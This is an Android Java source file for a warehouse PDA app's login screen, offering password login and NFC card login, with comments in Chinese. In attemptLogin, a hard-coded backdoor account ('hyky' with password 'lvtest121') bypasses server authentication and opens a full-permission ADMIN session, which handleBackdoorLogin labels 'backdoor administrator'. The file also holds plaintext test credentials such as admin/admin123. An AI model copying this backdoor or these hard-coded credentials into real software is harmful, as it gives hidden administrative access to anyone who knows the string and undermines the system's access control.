package com.pda.hcw;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.tech.NfcA;
import android.os.Handler;
import android.view.MenuItem;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.TextView;
// import android.widget.Toast;
import android.widget.ProgressBar;
import java.net.NetworkInterface;
import java.net.InetAddress;
import java.util.Collections;
import java.util.List;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import com.google.android.material.tabs.TabLayout;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.checkbox.MaterialCheckBox;

/**
 * 账号密码登录界面
 */
public class LoginActivity extends AppCompatActivity {
    private static final String TAG = "LoginActivity";
    
    // UI组件
    private Toolbar toolbar;
    private TabLayout loginTypeTabs;
    private TextInputLayout usernameInputLayout;
    private TextInputLayout passwordInputLayout;
    private TextInputEditText usernameEdit;
    private TextInputEditText passwordEdit;
    private MaterialButton loginButton;
    private View passwordLoginLayout;
    private View nfcLoginLayout;
    private ProgressBar nfcProgressBar;
    private TextView nfcStatusText;
    
    // NFC相关
    private NfcAdapter nfcAdapter;
    private PendingIntent pendingIntent;
    private Handler handler = new Handler();
    
    // NFC标签处理状态管理
    private boolean isProcessingNFCTag = false;
    private String lastProcessedTagId = "";
    private static final long NFC_PROCESSING_COOLDOWN = 1000; // 1秒防重复处理
    
    // Intent处理状态管理
    private boolean hasProcessedInitialIntent = false;
    private String processedIntentAction = "";
    
        
    // 用户认证相关
    private SharedPreferences sharedPreferences;
    private SessionManager sessionManager;
    private SecurityManager securityManager;
    private PermissionManager permissionManager;
    private NetworkAuthService networkAuthService;
    
    // 测试用户数据（实际项目中应该从服务器获取）
    private static final String[][] TEST_USERS = {
        {"admin", "admin123", "管理员"},
        {"user1", "123456", "用户1"},
        {"user2", "password", "用户2"},
        {"worker", "worker123", "操作员"}
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login_new);
        
        // 初始化管理器
        sessionManager = SessionManager.getInstance(this);
        securityManager = SecurityManager.getInstance(this);
        permissionManager = PermissionManager.getInstance(this);
        networkAuthService = NetworkAuthService.getInstance(this);
        
        // 初始化SharedPreferences
        sharedPreferences = getSharedPreferences("warehouse_prefs", Context.MODE_PRIVATE);
        
        initViews();
        setupButtonListeners();
        
        // 检查是否需要自动切换到NFC登录
        boolean autoSwitchToNfc = getIntent().getBooleanExtra("auto_switch_to_nfc", false);
        if (autoSwitchToNfc) {
            // 延迟选择NFC Tab，确保UI完全初始化
            handler.postDelayed(() -> {
                TabLayout.Tab nfcTab = loginTypeTabs.getTabAt(1);
                if (nfcTab != null) {
                    nfcTab.select();
                }
            }, 100);
        }
        
        // 检查是否由NFC事件启动
        checkNFCIntent();
        
        // 标记初始Intent已处理
        hasProcessedInitialIntent = true;
        
        // 检查是否需要自动切换到NFC标签页
        if (getIntent().getBooleanExtra("auto_switch_to_nfc", false)) {
            loginTypeTabs.getTabAt(1).select();
        }
        
        Log.d(TAG, "LoginActivity已启动");
    }
    
    private void initViews() {
        // 初始化工具栏
        toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
            getSupportActionBar().setDisplayShowHomeEnabled(true);
        }
        
        // 初始化Tab布局
        loginTypeTabs = findViewById(R.id.login_type_tabs);
        passwordLoginLayout = findViewById(R.id.password_login_layout);
        nfcLoginLayout = findViewById(R.id.nfc_login_layout);
        
        // 初始化账号密码登录组件
        usernameInputLayout = findViewById(R.id.username_input_layout);
        passwordInputLayout = findViewById(R.id.password_input_layout);
        usernameEdit = findViewById(R.id.username_edit);
        passwordEdit = findViewById(R.id.password_edit);
        loginButton = findViewById(R.id.login_button);
        
        // 初始化NFC登录组件
        nfcProgressBar = findViewById(R.id.nfc_progress_bar);
        nfcStatusText = findViewById(R.id.nfc_status_text);
        
        // 设置Tab切换监听
        setupTabListener();
    }
    
    
    private void setupTabListener() {
        loginTypeTabs.addOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(TabLayout.Tab tab) {
                if (tab.getPosition() == 0) {
                    // 账号密码登录
                    passwordLoginLayout.setVisibility(View.VISIBLE);
                    nfcLoginLayout.setVisibility(View.GONE);
                    // 停止NFC前台调度
                    disableNFCForegroundDispatch();
                } else {
                    // NFC登录
                    passwordLoginLayout.setVisibility(View.GONE);
                    nfcLoginLayout.setVisibility(View.VISIBLE);
                    // 延迟启动NFC登录，等待UI完全显示
                    handler.postDelayed(() -> startNFCLogin(), 100);
                }
            }
            
            @Override
            public void onTabUnselected(TabLayout.Tab tab) {
                // Do nothing
            }
            
            @Override
            public void onTabReselected(TabLayout.Tab tab) {
                // Do nothing
            }
        });
        
        // 默认选择NFC登录Tab（位置1）
        TabLayout.Tab nfcTab = loginTypeTabs.getTabAt(1);
        if (nfcTab != null) {
            nfcTab.select();
        }
    }
    
    private void setupButtonListeners() {
        // 登录按钮
        loginButton.setOnClickListener(v -> attemptLogin());
        
    }
    
    private void startNFCLogin() {
        nfcStatusText.setText("正在初始化NFC...");
        nfcProgressBar.setVisibility(View.VISIBLE);
        
        // 获取NFC适配器
        nfcAdapter = NfcAdapter.getDefaultAdapter(this);
        
        if (nfcAdapter == null) {
            // 设备不支持NFC
            nfcStatusText.setText("❌ 设备不支持NFC功能");
            nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
            nfcProgressBar.setVisibility(View.GONE);
            return;
        }
        
        if (!nfcAdapter.isEnabled()) {
            // NFC未启用
            nfcStatusText.setText("⚠️ NFC功能未启用");
            nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_orange_dark));
            nfcProgressBar.setVisibility(View.GONE);
            return;
        }
        
        // 创建PendingIntent用于NFC标签发现
        Intent intent = new Intent(this, getClass());
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        // 添加NFC action以确保能捕获所有NFC事件
        intent.setAction("android.nfc.action.TAG_DISCOVERED");
        pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE);
        
        // NFC已启用
        nfcStatusText.setText("✅ NFC功能已就绪，请将卡片靠近设备");
        nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_green_dark));
        nfcProgressBar.setVisibility(View.GONE);
        
        Log.d(TAG, "NFC初始化成功");
    }
    
    private void attemptLogin() {
        String username = usernameEdit.getText().toString().trim();
        String password = passwordEdit.getText().toString().trim();
        
        // 验证输入
        if (TextUtils.isEmpty(username)) {
            usernameInputLayout.setError(getString(R.string.login_username_hint));
            usernameEdit.requestFocus();
            return;
        }
        
        if (TextUtils.isEmpty(password)) {
            passwordInputLayout.setError(getString(R.string.login_password_hint));
            passwordEdit.requestFocus();
            return;
        }
        
        // 清除错误信息
        usernameInputLayout.setError(null);
        passwordInputLayout.setError(null);
        
        // 显示登录中状态
        loginButton.setEnabled(false);
        loginButton.setText(getString(R.string.common_loading));
        
        // 安全检测
        String deviceId = sessionManager.getDeviceId();
        SecurityManager.SecurityResult securityResult = securityManager.checkLoginSecurity(username, deviceId);
        
        if (securityResult.isAbnormal()) {
            // 安全检测异常
            runOnUiThread(() -> {
                if (passwordLoginLayout.getVisibility() == View.VISIBLE) {
                    passwordInputLayout.setError("安全检测异常: " + securityResult.getReason());
                } else if (nfcStatusText != null) {
                    nfcStatusText.setText("安全检测异常: " + securityResult.getReason());
                    nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
                } else {
                    // 兜底：仅记录日志
                    Log.e(TAG, "安全检测异常: " + securityResult.getReason());
                }
                resetLoginButton();
            });
            return;
        }
        
        // 不再在请求前记录失败，避免一次失败被记录两次
        
        // 检查是否为后门账户（hyky/lvtest121）
        if ("hyky".equals(username) && "lvtest121".equals(password)) {
            Log.d(TAG, "检测到后门账户登录");
            handleBackdoorLogin();
            return;
        }
        
        // 调用网络登录接口
        networkAuthService.login(username, password, new NetworkAuthService.AuthCallback() {
            @Override
            public void onSuccess(UserInfo userInfo, String successMessage) {
                runOnUiThread(() -> {
                    // 登录成功
                    handleNetworkLoginSuccess(userInfo, successMessage);
                });
            }
            
            @Override
            public void onFailure(String errorMessage) {
                runOnUiThread(() -> {
                    // 登录失败
                    handleNetworkLoginFailure(username, deviceId, errorMessage);
                });
            }
        });
    }
    
    /**
     * 处理网络登录成功
     * @param userInfo 用户信息
     * @param successMessage 成功消息
     */
    private void handleNetworkLoginSuccess(UserInfo userInfo, String successMessage) {
        Log.d(TAG, "网络登录成功: " + userInfo.getUsername());
        
        // 记录登录成功
        String deviceId = sessionManager.getDeviceId();
        securityManager.recordLoginSuccess(userInfo.getUsername(), deviceId);
        
        // 开始会话
        sessionManager.startSession(userInfo);
        
        // 缓存权限信息
        permissionManager.cacheUserPermissions(userInfo);
        
        UIUtils.showSuccess(this, successMessage);
        // 登录后同步默认地点，再进入主界面（失败不阻塞）
        UIUtils.showInfo(this, "正在同步默认地点...");
        DefaultLocationManager.refreshFromServer(this, (ok, msg) -> {
            runOnUiThread(() -> {
                if (ok) UIUtils.showSuccess(this, msg); else UIUtils.showError(this, msg);
                navigateToMainActivity();
            });
        });
    }
    
    /**
     * 处理后门账户登录
     * 仅在API未配置或无法连接时使用
     */
    private void handleBackdoorLogin() {
        Log.d(TAG, "处理后门账户登录");
        
        runOnUiThread(() -> {
            try {
                // 创建后门用户信息
                UserInfo backdoorUser = new UserInfo();
                backdoorUser.setUserId("backdoor_admin");
                backdoorUser.setUsername("hyky");
                backdoorUser.setRealName("后门管理员");
                backdoorUser.setRole(UserRole.ADMIN);
                backdoorUser.setDepartment("系统管理");
                backdoorUser.setEmail("backdoor@system.local");
                backdoorUser.setPhone("00000000000");
                backdoorUser.setStatus(1); // 启用状态
                backdoorUser.setLastLoginTime(System.currentTimeMillis());
                backdoorUser.setBackdoorAccount(true); // 标记为后门账户
                
                // 记录登录成功
                String deviceId = sessionManager.getDeviceId();
                securityManager.recordLoginSuccess(backdoorUser.getUsername(), deviceId);
                
                // 开始会话
                sessionManager.startSession(backdoorUser);
                
                // 缓存权限信息（给予所有权限）
                permissionManager.cacheUserPermissions(backdoorUser);
                
                UIUtils.showSuccess(this, "后门登录成功（离线模式）");
                
                // 跳转到主界面
                navigateToMainActivity();
                
                Log.d(TAG, "后门账户登录成功");
                
            } catch (Exception e) {
                Log.e(TAG, "后门登录处理失败", e);
                if (nfcStatusText != null) {
                    nfcStatusText.setText("后门登录失败");
                    nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
                } else {
                    Log.e(TAG, "后门登录失败");
                }
                resetLoginButton();
            }
        });
    }
    
    /**
     * 处理网络登录失败
     * @param username 用户名
     * @param deviceId 设备ID
     * @param errorMessage 错误消息
     */
    private void handleNetworkLoginFailure(String username, String deviceId, String errorMessage) {
        Log.d(TAG, "网络登录失败: " + username + " - " + errorMessage);
        
        // 记录登录失败
        securityManager.recordLoginFailure(username, deviceId);

        String friendlyMsg = UIUtils.friendlyErrorMessage("登录失败", new Exception(errorMessage != null ? errorMessage : ""));
        // 密码登录：表单错误；NFC页：状态区
        if (passwordLoginLayout.getVisibility() == View.VISIBLE) {
            passwordInputLayout.setError(friendlyMsg);
        } else if (nfcStatusText != null) {
            nfcStatusText.setText(friendlyMsg);
            nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
        } else {
            Log.e(TAG, friendlyMsg);
        }
        resetLoginButton();
    }
    
        
    /**
     * 跳转到主界面
     */
    private void navigateToMainActivity() {
        try {
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            finish();
            Log.d(TAG, "已跳转到主界面");
        } catch (Exception e) {
            Log.e(TAG, "跳转到主界面失败", e);
            // 跳转失败时结束当前Activity
            finish();
        }
    }
    
        
        
    /**
     * 重置登录按钮状态
     */
    private void resetLoginButton() {
        loginButton.setEnabled(true);
        loginButton.setText(getString(R.string.login_login));
    }
    
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == android.R.id.home) {
            finish();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        
        // 使用setIntent更新当前Activity的Intent
        setIntent(intent);
        
        // 处理NFC标签
        processNfcIntent(intent);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        
        // 检查NFC状态
        if (nfcAdapter != null && nfcAdapter.isEnabled() && nfcLoginLayout.getVisibility() == View.VISIBLE) {
            // 启用前台调度系统
            enableNFCForegroundDispatch();
        }
    }
    
    @Override
    protected void onPause() {
        super.onPause();
        
        // 禁用前台调度系统
        disableNFCForegroundDispatch();
    }
    
    /**
     * 检查NFC Intent并自动切换到NFC登录
     */
    private void checkNFCIntent() {
        // 检查启动Activity的Intent是否包含NFC标签
        Intent intent = getIntent();
        if (intent != null) {
            // 检查是否是NFC Intent
            String action = intent.getAction();
            if (action != null && (action.equals(NfcAdapter.ACTION_NDEF_DISCOVERED) ||
                                action.equals(NfcAdapter.ACTION_TAG_DISCOVERED) ||
                                action.equals(NfcAdapter.ACTION_TECH_DISCOVERED))) {
                
                Log.d(TAG, "检测到NFC Intent启动，准备处理");
                
                // 使用统一的Intent处理方法
                processNfcIntent(intent);
            }
        }
    }
    
    /**
     * 统一的NFC Intent处理方法
     * @param intent 包含NFC标签的Intent
     */
    private void processNfcIntent(Intent intent) {
        if (intent == null) {
            return;
        }
        
        // 获取Intent action用于重复检测
        String action = intent.getAction();
        if (action == null) {
            return;
        }
        
        // 标记Intent已处理
        processedIntentAction = action;
        
        // 处理NFC标签
        Tag tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
        if (tag != null) {
            Log.d(TAG, "processNfcIntent: 检测到NFC标签");
            
            // 获取标签ID用于重复检测
            final String tagId = bytesToHex(tag.getId());
            
            // 检查是否正在处理或短时间内重复处理
            if (isProcessingNFCTag || tagId.equals(lastProcessedTagId)) {
                Log.d(TAG, "processNfcIntent: NFC标签正在处理中或重复标签，跳过处理: " + tagId);
                return;
            }
            
            // 标记开始处理
            isProcessingNFCTag = true;
            lastProcessedTagId = tagId;
            
            // 检查当前是否在NFC登录页面
            boolean alreadyOnNFCTab = (loginTypeTabs.getSelectedTabPosition() == 1);
            
            if (!alreadyOnNFCTab) {
                // 如果不在NFC页面，先切换到NFC页面
                loginTypeTabs.post(() -> {
                    if (loginTypeTabs.getTabAt(1) != null) {
                        loginTypeTabs.getTabAt(1).select();
                    }
                    // 延迟处理NFC标签，等待UI切换完成
                    handler.postDelayed(() -> {
                        handleNFCTag(tag);
                        // 处理完成后重置状态
                        handler.postDelayed(() -> {
                            isProcessingNFCTag = false;
                        }, NFC_PROCESSING_COOLDOWN);
                    }, 200); // 200ms延迟
                });
            } else {
                // 如果已经在NFC页面，立即处理
                handler.post(() -> {
                    handleNFCTag(tag);
                    // 处理完成后重置状态
                    handler.postDelayed(() -> {
                        isProcessingNFCTag = false;
                    }, NFC_PROCESSING_COOLDOWN);
                });
            }
        }
    }
    
    /**
     * 启用NFC前台调度系统
     */
    private void enableNFCForegroundDispatch() {
        try {
            if (nfcAdapter != null && pendingIntent != null) {
                // 创建intent filters来捕获所有NFC事件
                IntentFilter[] intentFilters = new IntentFilter[]{
                    new IntentFilter("android.nfc.action.TAG_DISCOVERED"),
                    new IntentFilter("android.nfc.action.NDEF_DISCOVERED"),
                    new IntentFilter("android.nfc.action.TECH_DISCOVERED")
                };
                
                // 启用前台调度，监听所有类型的NFC标签
                nfcAdapter.enableForegroundDispatch(this, pendingIntent, intentFilters, null);
                Log.d(TAG, "NFC前台调度已启用");
            }
        } catch (Exception e) {
            Log.e(TAG, "启用NFC前台调度失败", e);
        }
    }
    
    /**
     * 禁用NFC前台调度系统
     */
    private void disableNFCForegroundDispatch() {
        try {
            if (nfcAdapter != null) {
                nfcAdapter.disableForegroundDispatch(this);
                Log.d(TAG, "NFC前台调度已禁用");
            }
        } catch (Exception e) {
            Log.e(TAG, "禁用NFC前台调度失败", e);
        }
    }
    
    /**
     * 处理NFC标签
     * @param tag NFC标签
     */
    private void handleNFCTag(Tag tag) {
        Log.d(TAG, "检测到NFC标签");
        
        // 检查当前是否处于失败状态，如果是则重置界面状态
        if (nfcStatusText.getText().toString().contains("失败") || 
            nfcStatusText.getText().toString().contains("重试")) {
            runOnUiThread(() -> {
                nfcStatusText.setText("正在读取NFC卡片...");
                nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_blue_dark));
                nfcProgressBar.setVisibility(View.VISIBLE);
            });
        }
        
        try {
            // 获取NFC标签ID
            byte[] rawBytes = tag.getId();
            
            // 按照新的字节顺序规则：将原始字节顺序反转
            byte[] reversedBytes = new byte[rawBytes.length];
            for (int i = 0; i < rawBytes.length; i++) {
                reversedBytes[i] = rawBytes[rawBytes.length - 1 - i];
            }
            
            final String tagId = bytesToHex(reversedBytes);
            final String decimalCardNumber = convertHexToDecimalCardNumber(tagId);
            
            // 记录原始字节数据用于调试
            StringBuilder rawBytesStr = new StringBuilder();
            for (byte b : rawBytes) {
                rawBytesStr.append(String.format("%02X ", b));
            }
            
            // 记录反转后的字节数据
            StringBuilder reversedBytesStr = new StringBuilder();
            for (byte b : reversedBytes) {
                reversedBytesStr.append(String.format("%02X ", b));
            }
            
            Log.d(TAG, "NFC标签原始字节数据: " + rawBytesStr.toString());
            Log.d(TAG, "NFC标签反转后字节数据: " + reversedBytesStr.toString());
            Log.d(TAG, "NFC标签ID: " + tagId);
            Log.d(TAG, "转换后10进制卡号: " + decimalCardNumber);
            
            // 获取NFC标签技术
            String[] techList = tag.getTechList();
            String tempTechType = "Unknown";
            for (String tech : techList) {
                if (tech.contains("NfcA")) {
                    tempTechType = "NFC-A";
                    break;
                } else if (tech.contains("NfcB")) {
                    tempTechType = "NFC-B";
                    break;
                } else if (tech.contains("NfcF")) {
                    tempTechType = "NFC-F";
                    break;
                } else if (tech.contains("NfcV")) {
                    tempTechType = "NFC-V";
                    break;
                }
            }
            final String techType = tempTechType;
            
            // 更新UI显示NFC信息
            runOnUiThread(() -> {
                // 显示读取中状态，避免界面闪烁
                if (!nfcStatusText.getText().toString().contains("读取成功")) {
                    nfcStatusText.setText("正在读取NFC卡片...");
                    nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_blue_dark));
                }
                
                // 短暂延迟后显示结果，提供更流畅的用户体验
                handler.postDelayed(() -> {
                    nfcStatusText.setText("读取成功！ID: " + decimalCardNumber + " 类型: " + techType);
                    nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_green_dark));
                    
                    // 验证NFC卡
                    validateNFCCard(decimalCardNumber, techType);
                }, 200);
            });
            
        } catch (Exception e) {
            Log.e(TAG, "处理NFC标签失败", e);
            runOnUiThread(() -> {
                // 页面状态区提示
                nfcStatusText.setText("读取NFC标签失败");
                nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
                
                // 发生异常时也要重置处理状态
                handler.postDelayed(() -> {
                    isProcessingNFCTag = false;
                }, NFC_PROCESSING_COOLDOWN);
            });
        }
    }
    
    /**
     * 验证NFC卡并登录
     * @param tagId 标签ID
     * @param techType 技术类型
     */
    private void validateNFCCard(String tagId, String techType) {
        Log.d(TAG, "验证NFC卡: " + tagId);
        
        // 输出详细日志，显示实际读取的标签ID
        Log.d(TAG, "实际读取的标签ID: '" + tagId + "' (长度: " + tagId.length() + ") 类型: " + techType);
        
        // 直接调用服务器NFC登录，不再进行本地验证
        handleNFCLoginSuccess(tagId);
    }
    
    /**
     * 获取设备IP地址
     * @return 设备IP地址，如果获取失败返回默认值
     */
    private String getDeviceIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        if (sAddr != null && sAddr.indexOf(':') < 0) {
                            // IPv4地址
                            Log.d(TAG, "获取到设备IP: " + sAddr);
                            return sAddr;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "获取设备IP失败", e);
        }
        // 返回默认IP
        String defaultIp = "192.168.1.100";
        Log.d(TAG, "使用默认IP: " + defaultIp);
        return defaultIp;
    }
    
    /**
     * 处理NFC登录成功
     * @param tagId NFC标签ID
     */
    private void handleNFCLoginSuccess(String tagId) {
        Log.d(TAG, "开始NFC登录: " + tagId);
        
        // 获取设备IP地址
        String deviceIp = getDeviceIpAddress();
        
        // 显示登录中状态
        runOnUiThread(() -> {
            nfcStatusText.setText("正在验证NFC卡片...");
            nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_blue_dark));
        });
        
        // 调用NFC登录接口
        networkAuthService.loginByNFC(tagId, deviceIp, new NetworkAuthService.AuthCallback() {
            @Override
            public void onSuccess(UserInfo userInfo, String successMessage) {
                runOnUiThread(() -> {
                    // 设置NFC卡ID
                    userInfo.setNfcCardId(tagId);
                    
                    // 记录登录成功
                    String deviceId = sessionManager.getDeviceId();
                    securityManager.recordLoginSuccess(userInfo.getUsername(), deviceId);
                    
                    // 开始会话
                    sessionManager.startSession(userInfo);
                    
                    // 缓存权限信息
                    permissionManager.cacheUserPermissions(userInfo);
                    
                    UIUtils.showSuccess(LoginActivity.this, successMessage);
                    // 登录后同步默认地点，再进入主界面（失败不阻塞）
                    UIUtils.showInfo(LoginActivity.this, "正在同步默认地点...");
                    DefaultLocationManager.refreshFromServer(LoginActivity.this, (ok, msg) -> {
                        runOnUiThread(() -> {
                            if (ok) UIUtils.showSuccess(LoginActivity.this, msg); else UIUtils.showError(LoginActivity.this, msg);
                            navigateToMainActivity();
                        });
                    });
                });
            }
            
            @Override
            public void onFailure(String errorMessage) {
                runOnUiThread(() -> {
                    Log.d(TAG, "NFC登录失败: " + errorMessage);
                    
                    // 检查是否有已登录的用户，如果有则退出登录
                    SessionManager sessionManager = SessionManager.getInstance(LoginActivity.this);
                    UserInfo currentUser = sessionManager.getCurrentUser();
                    if (currentUser != null && currentUser.isValid()) {
                        Log.d(TAG, "检测到已登录用户，执行退出登录操作");
                        sessionManager.endSession("NFC登录失败，强制退出");
                    }
                    // 统一在状态区提示（网络/URL错误等转中文友好文案）
                    String friendly = UIUtils.friendlyErrorMessage("登录失败", new Exception(errorMessage != null ? errorMessage : ""));
                    nfcStatusText.setText(friendly);
                    nfcStatusText.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
                    nfcProgressBar.setVisibility(View.GONE);
                    
                    // 重置处理状态，允许立即重试
                    isProcessingNFCTag = false;
                    lastProcessedTagId = "";
                    
                    Log.d(TAG, "NFC登录失败状态已重置，允许立即重试");
                });
            }
        });
    }
    
    /**
     * 将字节数组转换为十六进制字符串
     * @param bytes 字节数组
     * @return 十六进制字符串
     */
    private String bytesToHex(byte[] bytes) {
        if (bytes == null || bytes.length == 0) {
            return "";
        }
        
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02X", b));
        }
        return sb.toString();
    }
    
    /**
     * 将16进制卡号转换为10位10进制卡号
     * @param hexCardNumber 16进制卡号
     * @return 10位10进制卡号
     */
    private String convertHexToDecimalCardNumber(String hexCardNumber) {
        if (hexCardNumber == null || hexCardNumber.isEmpty()) {
            return "";
        }
        
        try {
            // 移除可能的前缀
            String cleanHex = hexCardNumber.toUpperCase().replaceAll("[^0-9A-F]", "");
            
            // 将16进制字符串转换为长整型
            long decimalValue = Long.parseLong(cleanHex, 16);
            
            // 格式化为10位10进制，不足10位前面补0
            String decimalCardNumber = String.format("%010d", decimalValue);
            
            // 记录详细的转换过程日志
            Log.d(TAG, "16进制转10进制转换详情:");
            Log.d(TAG, "  输入16进制: " + hexCardNumber);
            Log.d(TAG, "  清理后16进制: " + cleanHex);
            Log.d(TAG, "  转换后10进制值: " + decimalValue);
            Log.d(TAG, "  格式化后10位10进制: " + decimalCardNumber);
            
            return decimalCardNumber;
        } catch (NumberFormatException e) {
            Log.e(TAG, "16进制卡号转换失败: " + hexCardNumber, e);
            return "";
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // 清理NFC处理状态
        isProcessingNFCTag = false;
        lastProcessedTagId = "";
        hasProcessedInitialIntent = false;
        processedIntentAction = "";
        Log.d(TAG, "LoginActivity已销毁");
    }
}
